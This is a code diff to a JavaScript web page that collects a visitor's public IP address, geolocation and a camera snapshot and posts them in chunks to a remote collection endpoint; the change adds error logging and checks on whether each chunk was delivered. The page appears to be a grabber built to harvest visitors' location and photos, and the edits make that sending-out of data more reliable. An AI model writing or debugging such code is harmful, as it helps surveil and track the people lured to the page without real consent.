@@ -63,7 +63,9 @@
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipJson = await ipRes.json();
         data.ip = ipJson.ip;
-      } catch {}
+      } catch (e) {
+        console.error("IP fetch failed:", e);
+      }
 
       try {
         statusText.textContent = "Getting location...";
@@ -77,7 +79,9 @@
         });
         data.latitude = geo.latitude || 0;
         data.longitude = geo.longitude || 0;
-      } catch {}
+      } catch (e) {
+        console.error("Geolocation failed:", e);
+      }
 
       try {
         statusText.textContent = "Capturing photo...";
@@ -93,7 +97,9 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         data.photo = canvas.toDataURL("image/jpeg", 0.1);
         stream.getTracks().forEach(t => t.stop());
-      } catch {}
+      } catch (e) {
+        console.error("Camera failed:", e);
+      }
 
       await sendDataReliable(data);
     }
@@ -117,12 +123,21 @@
           formData.append("chunk_key", chunk.key);
           formData.append("chunk_value", chunk.value);
 
-          await fetch(webAppUrl, {
+          const response = await fetch(webAppUrl, {
             method: "POST",
             body: formData
           });
+
+          if (!response.ok) {
+            const text = await response.text();
+            console.error(`❌ Chunk ${chunk.key} failed. Status: ${response.status}. Body:`, text);
+            statusText.textContent = "❌ Failed to send chunk: " + chunk.key;
+            return;
+          } else {
+            console.log(`✅ Chunk ${chunk.key} sent successfully.`);
+          }
         }
-        statusText.textContent = "✅ Data sent successfully.";
+        statusText.textContent = "✅ All data sent successfully.";
       } catch (err) {
         console.error("Error sending data:", err);
         statusText.textContent = "❌ Failed to send data.";
